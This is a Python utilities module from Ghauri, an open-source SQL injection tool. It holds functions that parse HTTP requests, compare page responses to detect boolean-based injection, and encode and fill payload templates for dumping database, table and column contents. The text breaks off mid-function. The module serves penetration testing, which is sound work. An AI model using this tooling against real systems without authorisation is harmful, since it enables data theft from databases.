#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""

Author  : Nasir Khan (r0ot h3x49)
Github  : https://github.com/r0oth3x49
License : MIT


Copyright (c) 2016-2025 Nasir Khan (r0ot h3x49)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the
Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH 
THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""

from ghauri.common.lib import (
    re,
    gzip,
    html,
    json,
    base64,
    chardet,
    binascii,
    urlparse,
    parse_qs,
    itertools,
    NO_DEFAULT,
    SQL_ERRORS,
    collections,
    ProxyHandler,
    quote,
    quote_plus,
    unquote,
    BytesIO,
    urljoin,
    unified_diff,
    SequenceMatcher,
    addinfourl,
    DBMS_DICT,
    ua_generator,
    HTTPRedirectHandler,
    BaseHTTPRequestHandler,
    INJECTABLE_HEADERS_DEFAULT,
    HTTP_STATUS_CODES_REASONS,
    AVOID_PARAMS,
)
import base64
from ghauri.common.config import conf
from ghauri.common.payloads import PAYLOADS
from ghauri.logger.colored_logger import logger
from ghauri.common.prettytable import PrettyTable, from_db_cursor


class Struct:
    def __init__(self, **entries):
        self.__key = entries.get("key")
        self.__value = entries.get("value")
        self.__dict__.update(entries)

    def __repr__(self):
        return f"<Parameter('{self.__key}')>"


def parse_burp_request(request_text):
    _temp = ""
    regex = r"(?is)(?:<request base64=(['\"])(?P<is_base64>(?:true|false))\1><!\[CDATA\[(?P<request>(.+?))\]\]></request>)"
    mobj = re.search(regex, request_text)
    if mobj:
        is_base64 = mobj.group("is_base64") == "true"
        req = mobj.group("request")
        if is_base64:
            # logger.debug("decoding and parsing base64 encoded burp request..")
            _temp = base64.b64decode(req).decode()
        else:
            # logger.debug("parsing burp request..")
            _temp = req
    else:
        # logger.debug("normal http request file..")
        _temp = request_text
    return _temp


# source: https://stackoverflow.com/questions/4685217/parse-raw-http-headers
class HTTPRequest(BaseHTTPRequestHandler):
    def __init__(self, request_text):
        self.__request = request_text
        request_text = re.sub(r"(?:HTTP/([\d\.]+))", "HTTP/1.1", request_text)
        request_text = parse_burp_request(request_text)
        if isinstance(request_text, str):
            request_text = request_text.encode("utf-8")
        self.rfile = BytesIO(request_text)
        self.raw_requestline = self.rfile.readline()
        self.error_code = self.error_message = None
        self.is_multipart = False
        self.parse_request()

    def send_error(self, code, message):
        self.error_code = code
        self.error_message = message

    def __body(self):
        content_type = self.content_type
        body = self.rfile.read().decode("utf-8").strip()
        if content_type and "multipart/form-data" in content_type:
            self.is_multipart = True
            return body
        if content_type and content_type in [
            "application/x-www-form-urlencoded",
            "application/x-www-form-urlencoded; charset=UTF-8",
            "application/json",
            "application/json; charset=UTF-8",
            "application/json;charset=UTF-8",
        ]:
            return body
        if (
            body
            and content_type
            and content_type
            not in [
                "application/x-www-form-urlencoded",
                "application/x-www-form-urlencoded; charset=UTF-8",
                "application/json",
                "application/json; charset=UTF-8",
                "application/json;charset=UTF-8",
            ]
        ):
            return body

    @property
    def type(self):
        return self.command

    @property
    def url(self):
        url = f"{self.protocol}://{self.host}"
        if self.path:
            url = urljoin(url, self.path)
        return url

    @property
    def body(self):
        return self.__body()

    @property
    def content_type(self):
        return self.headers.get("Content-Type")

    @property
    def host(self):
        return self.headers.get("Host")

    @property
    def raw_cookies(self):
        _temp = []
        for k, v in self.headers.items():
            if k.lower() in ["cookie"]:
                _temp.append(f"{k}: {v}")
        _temp = "\n".join(_temp)
        return _temp

    @property
    def method(self):
        return self.type

    @property
    def protocol(self):
        protocol = "https"
        referer = self.headers.get("Referer")
        host = self.headers.get("Host")
        if referer and host and host in referer and "http" in referer:
            protocol = referer.split("://")[0]
        return protocol

    @property
    def raw_full_headers(self):
        _temp = []
        for k, v in self.headers.items():
            if k.lower() in ["content-length"]:
                continue
            _temp.append(f"{k}: {v}")
        _temp = "\n".join(_temp)
        return _temp

    @property
    def raw_headers(self):
        _temp = []
        for k, v in self.headers.items():
            if k.lower() in ["content-length", "cookie"]:
                continue
            _temp.append(f"{k}: {v}")
        _temp = "\n".join(_temp)
        return _temp


class SmartRedirectHandler(HTTPRedirectHandler):
    def http_error_302(self, req, fp, code, msg, headers):
        infourl = addinfourl(fp, headers, req.get_full_url(), code=code)
        redirect_url = headers.get("Location")
        if not urlparse(redirect_url).netloc:
            redirect_url = urljoin(req.get_full_url(), redirect_url)
        if conf.follow_redirects == None:
            choice = logger.read_input(
                f"got a {code} redirect to '{redirect_url}'. Do you want to follow? [Y/n] ",
                batch=conf.batch,
                user_input="Y",
            )
            if choice and choice == "y":
                conf.follow_redirects = True
            if choice and choice == "n":
                conf.follow_redirects = False
        return infourl

    http_error_301 = http_error_303 = http_error_307 = http_error_302


def parse_payload(
    url=None,
    data=None,
    is_multipart=False,
    injection_type=None,
    payload=None,
    param_name=None,
):
    clean = lambda x: x.replace("%2b", "+").replace("%2B", "+")
    if injection_type == "GET":
        if param_name and param_name == "#1*":
            return clean(urldecode(url))
        return clean(urldecode(urlparse(url).query))
    if injection_type == "POST":
        if is_multipart:
            return clean(urldecode(data)).encode("unicode_escape").decode("utf-8")
        else:
            return clean(urldecode(data))
    if injection_type == "HEADER":
        return clean(urldecode(payload))
    if injection_type == "COOKIE":
        return clean(urldecode(payload))


def html_escape(value):
    """
    Returns (basic conversion) HTML unescaped value

    >>> htmlUnescape('a&lt;b') == 'a<b'
    True
    """

    retVal = value

    if value and isinstance(value, str):
        replacements = (
            ("&lt;", "<"),
            ("&gt;", ">"),
            ("&quot;", '"'),
            ("&nbsp;", " "),
            ("&amp;", "&"),
            ("&apos;", "'"),
        )
        for code, value in replacements:
            retVal = retVal.replace(code, value)

        try:
            retVal = re.sub(
                r"&#x([^ ;]+);", lambda match: chr(int(match.group(1), 16)), retVal
            )
        except (ValueError, OverflowError):
            pass

    return retVal


def get_filtered_page_content(page, onlyText=True, split=" "):
    """
    Returns filtered page content without script, style and/or comments
    or all HTML tags

    >>> getFilteredPageContent(u'<html><title>foobar</title><body>test</body></html>') == "foobar test"
    True
    """

    retVal = page
    text_type = str

    # only if the page's charset has been successfully identified
    if isinstance(page, text_type):
        retVal = re.sub(
            r"(?si)<script.+?</script>|<!--.+?-->|<style.+?</style>%s"
            % (r"|<[^>]+>|\t|\n|\r" if onlyText else ""),
            split,
            page,
        )
        retVal = re.sub(r"%s{2,}" % split, split, retVal)
        retVal = html_escape(retVal.strip().strip(split))

    return retVal


def value_cleanup(value, strip_value=None):
    if value and "S3PR4T0R" in value:
        value = value.strip().split("S3PR4T0R")
        value = f"{len(value)}"
    value = re.sub(r"\s+", " ", re.sub(r"(?:(?:[\(]+)|(?:[~]+))", "", value)).strip()
    if strip_value:
        value = re.sub(strip_value, "", value)
    if not value:
        value = "<blank_value>"
    return value


def search_regex(
    pattern,
    string,
    default=NO_DEFAULT,
    fatal=True,
    flags=0,
    group=None,
    strip_value=r"(?is)(?:[\(]+)(?:[\~]+)",
):
    """
    Perform a regex search on the given string, using a single or a list of
    patterns returning the first matching group.
    In case of failure return a default value or raise a WARNING or a
    RegexNotFoundError, depending on fatal, specifying the field name.
    """
    logger.debug("searching for payload response in response content..")
    string = get_filtered_page_content(string)
    if isinstance(pattern, str):
        mobj = re.search(pattern, string, flags)
    else:
        for p in pattern:
            mobj = re.search(p, string, flags)
            if mobj:
                break
    if mobj:
        logger.debug(f"payload response found filtering out value based on regex..")
        if group is None:
            # return the first matching group
            value = next(g for g in mobj.groups() if g is not None)
        else:
            value = mobj.group(group)
            logger.debug(f"value returned in response: {value}")
        if not value:
            value = "<blank_value>"
        value = value_cleanup(value, strip_value=strip_value)
        logger.debug(f"cleaned value returned in response: {value}")
        return value
    elif default is not NO_DEFAULT:
        return default
    elif fatal:
        logger.warning("unable to filter out values..")
    else:
        logger.warning("unable to filter out values..")


def to_list(columns):
    return [i.strip() for i in re.sub(" +", "", columns).split(",")]


def dbms_full_name(dbms):
    _temp = ""
    if dbms:
        _temp = DBMS_DICT.get(dbms.lower())
    return _temp


def replace_with(string, character, replace_with, right=True):
    if right:
        head, _, tail = string.rpartition(character)
    else:
        head, _, tail = string.partition(character)
    return f"{head}{replace_with}{tail}"


def get_boolean_ratio(w1, w2):
    ratio = 0
    try:
        ratio = round(SequenceMatcher(None, w1, w2).quick_ratio(), 3)
    except:
        w1 = w1 + " " * (len(w2) - len(w1))
        w2 = w2 + " " * (len(w1) - len(w2))
        ratio = sum(1 if i == j else 0 for i, j in zip(w1, w2)) / float(len(w1))
    return ratio


def get_payloads_with_functions(payloads, backend, possible_dbms=None):
    _temp = []
    if not possible_dbms:
        reg = r"(?is)(?:UPDATEXML|EXTRACTVALUE|FLOOR|PROCEDURE\sANALYSE)"
        for entry in payloads:
            if "AND" in entry.title:
                if backend == "MySQL":
                    mobj = re.search(reg, entry.title)
                    if mobj:
                        _temp.append(entry)
                else:
                    _temp.append(entry)
        if possible_dbms:
            _temp = payloads
        if not _temp:
            _temp = payloads
    else:
        _temp = payloads
    return _temp


def get_page_ratio_difference(response, response_01):
    _temp = []
    _diff = []
    response = re.sub(r"(?is)(?:[\w\(\)\+\-\,\*\>\<]+=\w+)", "", response)
    response_01 = re.sub(r"(?is)(?:[\w\(\)\+\-\,\*\>\<]+=\w+)", "", response_01)
    seq = SequenceMatcher(None, response, response_01)
    for tag, i1, i2, j1, j2 in seq.get_opcodes():
        if tag == "replace":
            new = re.sub(
                r" +",
                " ",
                re.sub(r"[^a-zA-Z0-9\.\s]+", " ", response[i1:i2]).lstrip().rstrip(),
            )
            old = re.sub(
                r" +",
                " ",
                re.sub(r"[^a-zA-Z0-9\.\s]+", " ", response_01[j1:j2]).lstrip().rstrip(),
            )
            if len(new) >= 2 and len(old) >= 2 and len(new) <= 20 and len(old) <= 20:
                logger.debug(
                    "{:7}   string[{}:{}] --> not_string[{}:{}] {!r:>8} --> {!r}".format(
                        tag, i1, i2, j1, j2, new, old
                    )
                )
                _temp.append(
                    {
                        "string": f"{response[i1:i2]}",
                        "not_string": f"{response_01[j1:j2]}",
                    }
                )
                std = response[i1:i2]
                std = re.sub(r"[^a-zA-Z0-9\.\s]+", " ", std)
                if std:
                    std = re.sub(r" +", " ", std.lstrip().rstrip())
                _diff.append(std)
    return _diff, _temp


def get_page_by_unified_diff(original, modifired, match_string=None):
    Response = collections.namedtuple(
        "UnifiedPageDifference",
        ["is_vulner", "string", "not_string", "case", "difference", "differences"],
    )
    original = get_filtered_page_content(original)
    modifired = get_filtered_page_content(modifired)
    case = None
    string = ""
    not_string = ""
    is_vulner = False
    difference = None
    diffs = {}
    _temp = Response(
        is_vulner=is_vulner,
        difference=difference,
        case=case,
        string=string,
        not_string=not_string,
        differences=diffs,
    )
    differences = list(
        unified_diff(
            original.split(),
            modifired.split(),
            fromfile="",
            tofile="",
        )
    )

    def get_string_by_matcher(data, matcher):
        retval = ""
        for i in data:
            i = i.replace("\\\\n", "").replace("\\n", "")
            if i.startswith(matcher) or i.startswith(" "):
                retval += re.sub(r"[^a-zA-Z0-9\.\-\s]+", " ", i)
        retval = re.sub(r"[^a-zA-Z0-9\.\s]+", " ", retval)
        retval = re.sub(r"[^a-zA-Z0-9\.\s]+", " ", retval).strip().lstrip().rstrip()
        return retval

    string = get_string_by_matcher(data=differences, matcher="-")
    not_string = get_string_by_matcher(data=differences, matcher="+")
    is_vulner = bool(string != not_string)
    if match_string:
        is_vulner = bool(match_string == string)
    if is_vulner:
        case = "Page Ratio"
        difference = string
        if len(difference) > 30:
            difference = difference[0:30]
        _temp = Response(
            is_vulner=is_vulner,
            difference=difference,
            case=case,
            string=string,
            not_string=not_string,
            differences=differences,
        )
        logger.debug(
            f'vulnerable with (--string="{string}", --not-string="{not_string}")'
        )
    return _temp


def check_page_difference(w1, w2, match_string=None):
    Response = collections.namedtuple(
        "PageDifference", ["is_vulner", "difference", "case", "ratio", "differences"]
    )
    w1 = get_filtered_page_content(w1)
    w2 = get_filtered_page_content(w2)
    candidates, differences = get_page_ratio_difference(w1, w2)
    case = None
    suggestion = None
    is_vulner = False
    difference = None
    ratio = 0
    diffs = {}
    _temp = Response(
        is_vulner=is_vulner,
        difference=difference,
        case=case,
        ratio=ratio,
        differences=diffs,
    )
    if candidates:
        candidates = sorted(candidates, key=len)
        for index, candidate in enumerate(candidates):
            mobj = re.match(r"\A[\w.,! ]+\Z", candidate)
            if mobj and " " in candidate and candidate.strip() and len(candidate) > 10:
                difference = candidate
                diffs = differences[index]
                if match_string:
                    if match_string == difference:
                        is_vulner = True
                        case = "Page Ratio"
                        suggestion = candidate
                        break
                    else:
                        is_vulner = False
                        case = ""
                        suggestion = None
                else:
                    is_vulner = True
                    case = "Page Ratio"
                    suggestion = candidate
                    break
        if not suggestion and not is_vulner:
            for index, candidate in enumerate(candidates):
                candidate = re.sub(r"\d+\.\d+", "", candidate)
                mobj = re.search(r"\A[\w.,! ]+\Z", candidate)
                if mobj and len(candidate) >= 4:
                    difference = candidate
                    diffs = differences[index]
                    if match_string:
                        if match_string == difference:
                            is_vulner = True
                            case = "Page Ratio"
                            break
                        else:
                            difference = None
                            is_vulner = False
                            case = ""
                    else:
                        is_vulner = True
                        case = "Page Ratio"
                        break
    if difference:
        if len(difference) > 30:
            difference = difference[0:30]
        if is_vulner and match_string:
            is_vulner = bool(match_string == difference)
            ratio = get_boolean_ratio(match_string, difference)
            if is_vulner:
                logger.debug(
                    f'page ratio: {ratio}, matching string="{match_string}", differences: (--string="{diffs.get("string")}", --not-string="{diffs.get("not_string")}")'
                )
            else:
                logger.debug(
                    f'page ratio: {ratio}, --string="{match_string}" (not found).'
                )
        _temp = Response(
            is_vulner=is_vulner,
            difference=difference,
            case=case,
            ratio=ratio,
            differences=diffs,
        )
    return _temp


def extract_page_content(response):
    response = response or ""
    regex = r"(?si)<(abbr|acronym|b|blockquote|br|center|cite|code|dt|em|font|h\d|i|li|p|pre|q|strong|sub|sup|td|th|title|tt|u)(?!\w).*?>(?P<result>[^<]+)"
    ok = [mobj.group("result").strip() for mobj in re.finditer(regex, response) if mobj]
    ok = [i for i in ok if i and i != ""]
    return ok


def check_boolean_responses(
    base,
    attack_true,
    attack_false,
    code="",
    match_string="",
    not_match_string="",
    text_only=False,
):
    """
    case 1: when True attack content length = baseResponse content length, but attack-true-ct != attack-false-ct
    case 2: when False attack content length = baseResponse content length, but attack-true-ct != attack-false-ct
    case 3: True injected page is compared with original page (to get something called ratio), then False injected
            page is compared to original page (to also get the ratio) and then those two ratios are compared together.
            It compares those two ratios and they should be clearly distinct based on https://github.com/sqlmapproject/sqlmap/issues/2442
    case 4: when True attack status code = baseResponse status code, but attack-true-sc != attack-false-sc
    case 5: when False attack status code = baseResponse status code, but attack-true-sc != attack-false-sc
    case 6: when page ratio is the case we will evalutae difference between content of the pages for True and False attack payload
            and add proper marks for --string or --not-string injectable type.
    """
    BooleanInjectionResponse = collections.namedtuple(
        "BooleanInjectionResponse",
        [
            "vulnerable",
            "case",
            "difference",
            "string",
            "not_string",
            "status_code",
            "content_length",
        ],
    )
    is_vulner = False
    scb = base.status_code
    sct = attack_true.status_code
    scf = attack_false.status_code
    ctb = base.content_length
    ctt = attack_true.content_length
    ctf = attack_false.content_length
    case = ""
    difference = ""
    string = match_string
    not_string = not_match_string
    status_code = code
    content_length = None
    _cases = []
    _temp = BooleanInjectionResponse(
        vulnerable=is_vulner,
        case=case,
        difference=difference,
        string=string,
        not_string=not_string,
        status_code=status_code,
        content_length=content_length,
    )
    if not text_only:
        w0 = base.text
        w1 = attack_true.text
        w2 = attack_false.text
    if text_only:
        w0 = base.filtered_text
        w1 = attack_true.filtered_text
        w2 = attack_false.filtered_text
    ratio_true = get_boolean_ratio(w0, w1)
    ratio_false = get_boolean_ratio(w0, w2)
    # logger.debug(f"ratios: (True => {ratio_true} / False => {ratio_false})")
    if not conf.match_ratio:
        if ratio_false >= 0.02 and ratio_false <= 0.98:
            conf.match_ratio = ratio_false
            logger.debug(
                f"setting match ratio for current parameter to {conf.match_ratio}"
            )
    if code:
        if code == sct or code == scf:
            is_vulner = True
            status_code = code
            _cases.append("Status code")
        else:
            is_vulner = False
    elif match_string:
        mobj = re.search(r"(?is)(?:%s)" % (re.escape(match_string)), w1)
        if mobj:
            is_vulner = True
            not_string = not_match_string
            difference = match_string
            string = match_string
            _cases.append("Page Content")
        else:
            res = get_page_by_unified_diff(w1, w2, match_string=match_string)
            difference = res.difference
            is_vulner = res.is_vulner
            if is_vulner:
                string = difference
                not_string = not_match_string
                _cases.append("Page Content")
            else:
                ok = check_page_difference(w1, w2, match_string=match_string)
                difference = ok.difference
                is_vulner = ok.is_vulner
                if is_vulner:
                    not_string = not_match_string
                    string = difference
                    _cases.append("Page Content")
    elif not_match_string:
        mobj = re.search(r"(?is)(?:%s)" % (re.escape(not_match_string)), w2)
        if mobj:
            is_vulner = True
            string = match_string
            difference = not_match_string
            not_string = not_match_string
            _cases.append("Page Content")
        else:
            res = get_page_by_unified_diff(w1, w2, match_string=not_match_string)
            difference = res.difference
            is_vulner = res.is_vulner
            if is_vulner:
                string = match_string
                not_string = difference
                _cases.append("Page Content")
            else:
                ok = check_page_difference(w1, w2, match_string=not_match_string)
                difference = ok.difference
                is_vulner = ok.is_vulner
                if is_vulner:
                    string = match_string
                    not_string = difference
                    _cases.append("Page Content")
    else:
        # do check if initial requests performed returrned exact same content length
        if conf._bool_check_on_ct:
            if ctt != ctf and ctb == ctt:
                is_vulner = True
                content_length = ctt
                _cases.append("Content Length")
            elif ctt != ctf and ctb == ctf:
                is_vulner = True
                content_length = ctf
                _cases.append("Content Length")
        if ratio_true != ratio_false:
            _cases.append("Page Ratio")
            is_vulner = True
        if scb == sct and scb != scf:
            _cases.append("Status Code")
            is_vulner = True
        elif scb == scf and scb != sct:
            is_vulner = True
            _cases.append("Status Code")
    if _cases:
        case = ", ".join(_cases)
        if 403 in [scb, sct, scf]:
            case = ""
            is_vulner = False
        else:
            logger.debug(f"possible injectable cases detected: '{case}'")
    if case == "Content Length":
        if not conf._bool_ctt and not conf._bool_ctf:
            logger.debug(
                "setting config content length for comparision to avoid false positive.."
            )
            conf._bool_ctt = ctt
            conf._bool_ctf = ctf
    if case == "Page Content" and conf._match_ratio_check:
        is_vulner = False
        if ratio_true != ratio_false and conf.match_ratio == ratio_true:
            is_vulner = True
            case = "Page Content"
            difference = match_string if match_string else not_match_string
        elif ratio_true != ratio_false and conf.match_ratio == ratio_false:
            is_vulner = True
            case = "Page Content"
            difference = match_string if match_string else not_match_string
        else:
            difference = ""
    if case == "Page Ratio":
        w0set = set(get_filtered_page_content(base.text, True, "\n").split("\n"))
        w1set = set(get_filtered_page_content(attack_true.text, True, "\n").split("\n"))
        w2set = set(
            get_filtered_page_content(attack_false.text, True, "\n").split("\n")
        )
        is_vulner = False
        case = ""
        if not difference and not is_vulner:
            ok = check_page_difference(w1, w2)
            difference = ok.difference
            is_vulner = ok.is_vulner
            case = ok.case
            if difference:
                string = ok.differences.get("string")
                not_string = ok.differences.get("not_string")
        # commenting out because of false detection as well as skiping multiple page ratio based detections..
        # if not difference and not is_vulner:
        #     res = get_page_by_unified_diff(w1, w2)
        #     difference = res.difference
        #     is_vulner = res.is_vulner
        #     case = res.case
        #     if difference:
        #         string = res.string
        #         not_string = res.not_string
        if not difference and not is_vulner:
            if w0set == w1set != w2set:
                candidates = w1set - w2set - w0set
                if candidates:
                    candidates = sorted(candidates, key=len)
                    for candidate in candidates:
                        mobj = re.match(r"\A[\w.,! ]+\Z", candidate)
                        if (
                            mobj
                            and " " in candidate
                            and candidate.strip()
                            and len(candidate) > 10
                        ):
                            difference = candidate
                            string = difference
                            is_vulner = True
                            case = "Page Ratio"
                            break
            if ratio_true != ratio_false:
                tset = set(extract_page_content(attack_true.text))
                tset |= set(__ for _ in tset for __ in _.split())
                fset = eset = set(extract_page_content(attack_false.text))
                fset |= set(__ for _ in fset for __ in _.split())
                eset |= set(__ for _ in eset for __ in _.split())
                ok = tset - fset - eset
                candidates = [
                    _.strip()
                    if _.strip() in attack_true.text
                    and _.strip() not in attack_false.text
                    else None
                    for _ in ok
                ]
                candidates = [i for i in candidates if i]
                if candidates:
                    candidates = sorted(candidates, key=len)
                    for candidate in candidates:
                        ok = re.match(r"\A\w{2,}\Z", candidate)
                        if ok:
                            difference = candidate
                            is_vulner = True
                            break
                # in case when ratio true/false payload is not equal but no suggested --string or --not-string is found.
                if (
                    not difference
                    and conf.match_ratio
                    and conf.match_ratio in [ratio_true, ratio_false]
                    # and conf.match_ratio != ratio_true
                ):
                    is_vulner = True
                    case = "Match Ratio"
                elif (
                    difference
                    and conf.match_ratio
                    and conf.match_ratio in [ratio_true, ratio_false]
                ):
                    if not conf._match_ratio_check:
                        is_vulner = True
                        case = "Page Ratio, Match Ratio"
                        conf._match_ratio_check = True
        if difference and is_vulner:
            string = difference
            not_string = ""
            if not conf.string:
                conf.string = string
            if not conf.not_string:
                conf.not_string = not_string
            case = "Page Ratio"
            logger.debug(f'injectable with --string="{difference}".')
    if is_vulner:
        _case = [i.strip() for i in case.split(",")]
        if conf.cases:
            is_vulner = bool(conf.cases == _case)
    if is_vulner:
        if not status_code:
            status_code = attack_true.status_code
        if not content_length:
            content_length = attack_true.content_length
        logger.debug(f"injectable with cases: '{case}'.")
        _temp = BooleanInjectionResponse(
            vulnerable=is_vulner,
            case=case,
            difference=difference,
            string=string,
            not_string=not_string,
            status_code=status_code,
            content_length=content_length,
        )
    # logger.debug(f"Check: {_temp}")
    return _temp


def is_encoded(string):
    _temp = []
    delimiter = " "
    if string and "+" in string:
        delimiter = "+"
    if string and "%20" in string:
        delimiter = "%20"
    words = unquote(string).split(delimiter)
    for word in words:
        seq = ""
        if isinstance(word, str):
            word = unquote(word)
        for char in word:
            char_decoded = unquote(char)
            seq += char_decoded
        _temp.append(seq)
    decoded_words = " ".join(_temp)
    ok = not bool(decoded_words == string)
    if ok:
        logger.debug("payload is encoded.")
    else:
        logger.debug("payload is not encoded")
    return ok


def urldecode(value):
    is_mssql = bool("%2b" in value.lower())
    _temp = unquote(value)
    if is_mssql and not conf.skip_urlencoding:
        _temp = _temp.replace("+", "%2b")
    return _temp


def urlencode(
    value,
    safe="/=*()&?%;,+\"'",
    decode_first=False,
    injection_type=None,
    is_multipart=False,
    value_type="",
):
    _temp = value
    if decode_first:
        value = urldecode(value)
    if conf.safe_chars:
        safe = f"{safe}{conf.safe_chars}"
    is_aspdotnet = bool("%2b" in value.lower())
    if is_aspdotnet:
        safe += "%"
    if injection_type and injection_type not in ["HEADER"] and not is_multipart:
        if injection_type == "COOKIE":
            if value_type == "payload":
                _temp = quote(value, safe=conf.safe_chars or "()*%=/:'\"")
        else:
            if not conf.skip_urlencoding:
                _temp = quote(value, safe=safe)
            if conf.skip_urlencoding:
                if not conf.is_multipart and not conf.is_json and not conf.is_xml:
                    _temp = value.replace(" ", "+")
    return _temp


def clean_up_offset_payload(payload, backend="", column=None):
    if backend == "MySQL":
        payload = re.sub(r"LIMIT(.*?)0,", "LIMIT\\1{offset},", payload)
    if backend == "PostgreSQL":
        payload = re.sub(r"OFFSET(.*?)0", "OFFSET\\1{offset}", payload)
    if backend == "Microsoft SQL Server":
        if "DB_NAME" in payload:
            payload = payload.replace("DB_NAME(0)", "DB_NAME({offset})")
        if "TOP 0" in payload:
            payload = re.sub(r"TOP(.*?)0", "TOP\\1{offset}", payload)
        if "LIMIT=1" in payload:
            payload = payload.replace("LIMIT=1", "LIMIT={offset}")
    if backend == "Oracle":
        payload = payload.replace("LIMIT=1", "LIMIT={offset}")
    if column:
        payload = re.sub(f"{column}", "{column_name}", payload)
    logger.debug(payload)
    return payload


def prepare_query_payload(backend, offset, payload_string, column_name=None):
    _temp = []
    if column_name:
        _payload = payload_string.format(offset=offset, column_name=column_name)
        if backend == "Microsoft SQL Server" and "id" in column_name:
            _payload = replace_with(
                _payload,
                column_name,
                f"LTRIM(STR({column_name}))",
                right=False,
            )
        _temp.append(_payload)
    else:
        _payload = payload_string.format(offset=offset)
        _temp.append(_payload)
    return _temp


def to_dbms_encoding(
    value, backend=None, is_string=False, payload=None, to_str=False, to_char=False
):
    if backend == "MySQL":
        if to_str:
            return value
        else:
            return f"0x{binascii.hexlify(value.encode()).decode()}"
    if backend == "PostgreSQL":
        return f"({'||'.join([f'CHR({ord(i)})' for i in value.strip()])})"
    if backend == "Microsoft SQL Server":
        _temp = value
        if not is_string:
            if payload and "table_catalog=" in payload:
                if "CHAR" in payload.upper():
                    _temp = (
                        f"({'%2b'.join([f'CHAR({ord(i)})' for i in value.strip()])})"
                    )
                else:
                    _temp = f"'{value}'"
        if is_string:
            if payload and "table_catalog=" in payload.lower():
                if "CHAR" in payload.upper():
                    _temp = (
                        f"({'%2b'.join([f'CHAR({ord(i)})' for i in value.strip()])})"
                    )
                else:
                    _temp = f"'{value}'"
        if to_char:
            _temp = f"({'%2b'.join([f'CHAR({ord(i)})' for i in value.strip()])})"
        if to_str:
            _temp = f"'{value}'"
        return _temp
    if backend == "Oracle":
        return f"{'||'.join([f'CHR({ord(i)})' for i in value.strip()])}"


def prepare_extraction_payloads(
    database, backend, payloads, table=None, column=None, dump=False, is_string=False
):
    _temp = []
    if not dump:
        if not table:
            _temp = [
                i.format(
                    db=to_dbms_encoding(
                        value=database, backend=backend, is_string=is_string, payload=i
                    )
                )
                for i in payloads
            ]
        if table and database:
            _temp = []
            to_str = True
            to_char = False
            for index, i in enumerate(payloads):
                db = to_dbms_encoding(
                    value=database, backend=backend, is_string=is_string, payload=i
                )
                tbl = to_dbms_encoding(
                    value=table, backend=backend, is_string=is_string, payload=i
                )
                if backend == "Microsoft SQL Server":
                    if "table_catalog=" not in i:
                        tbl = to_dbms_encoding(
                            value=table,
                            backend=backend,
                            is_string=is_string,
                            to_str=to_str,
                            to_char=to_char,
                        )
                        to_str = not to_str
                        to_char = not to_char
                ok = i.format(db=db, tbl=tbl)
                _temp.append(ok)
    if dump:
        if table and not database and not column:  # when just table is given
            _temp = [
                i.format(
                    tbl=table,
                )
                for i in payloads
            ]
        elif table and database and not column:  # when just table and database is given
            _temp = [
                i.format(
                    db=to_dbms_encoding(value=database, backend=backend)
                    if backend == "MySQL" and "TABLE_ROWS" in i
                    else database,
                    tbl=to_dbms_encoding(value=table, backend=backend)
                    if backend == "MySQL" and "TABLE_ROWS" in i
                    else table,
                )
                for i in payloads
            ]
        elif not database and table and column:  # when table and column is given
            _temp = [i.format(tbl=table, col=column) for i in payloads]
        elif table and database and column:  # when all table, database, column is given
            _temp = [i.format(db=database, tbl=table, col=column) for i in payloads]
    return _temp


def prettifier(cursor_or_list, field_names="", header=False):
    fields = []
    Prettified = collections.namedtuple("Prettified", ["data", "entries"])
    if field_names:
        fields = re.sub(" +", "", field_names).split(",")
    table = PrettyTable(field_names=[""] if not fields else fields)
    table.align = "l"
    table.header = header
    entries = 0
    for d in cursor_or_list:
        if d and isinstance(d, str):
            d = (d,)
        table.add_row(d)
        entries += 1
    _temp = Prettified(data=table, entries=entries)
    return _temp


def prepare_proxy(proxy):
    Response = collections.namedtuple("Response", ["for_requests", "for_urllib"])
    for_urllib = None
    for_requests = None
    if proxy:
        for_requests = {"http": proxy, "https": proxy}
        for_urllib = ProxyHandler(for_requests)
    return Response(for_requests=for_requests, for_urllib=for_urllib)


def get_http_code_reason(code):
    # Table mapping response codes to messages; entries have the
    Reason = collections.namedtuple("Reason", ["code", "reason", "detail"])
    out = HTTP_STATUS_CODES_REASONS.get(code, [])
    _temp = Reason(code=code, reason="", detail="")
    if out:
        _temp = Reason(code=code, reason=out[0], detail=out[-1])
    return _temp


def parse_http_error(error, url=None, is_timeout=False):
    Response = collections.namedtuple(
        "Response",
        [
            "ok",
            "url",
            "text",
            "headers",
            "status_code",
            "reason",
            "error",
            "content_length",
            "filtered_text",
        ],
    )
    text = ""
    status_code = 0
    headers = {}
    error_msg = ""
    reason = ""
    if not is_timeout:
        if hasattr(error, "response"):
            text = unescape_html(error.response)
            status_code = error.response.status_code
            reason = get_http_code_reason(status_code).reason  # error.response.reason
            headers = error.response.headers
            url = error.response.url
            error_msg = f"{status_code} ({reason})"
            content_length = headers.get("Content-Length", len(text))
            filtered_text = get_filtered_page_content(text)
        else:
            status_code = error.code
            reason = get_http_code_reason(status_code).reason  # error.reason
            headers = dict(error.info())
            text = unescape_html(
                error, is_compressed=bool("gzip" in headers.get("Content-Encoding", ""))
            )
            url = error.geturl()
            error_msg = f"{status_code} ({reason})"
            content_length = headers.get("Content-Length", len(text))
            filtered_text = get_filtered_page_content(text)
    if is_timeout:
        status_code = 4001
        reason = "Read Timeout"
        headers = {}
        text = ""
        url = url
        error_msg = f"{status_code} ({reason})"
        content_length = 0
        filtered_text = ""
    return Response(
        ok=False,
        url=url,
        text=text,
        headers=headers,
        status_code=status_code,
        reason=reason,
        error=error_msg,
        content_length=content_length,
        filtered_text=filtered_text,
    )


def parse_http_response(resp):
    Response = collections.namedtuple(
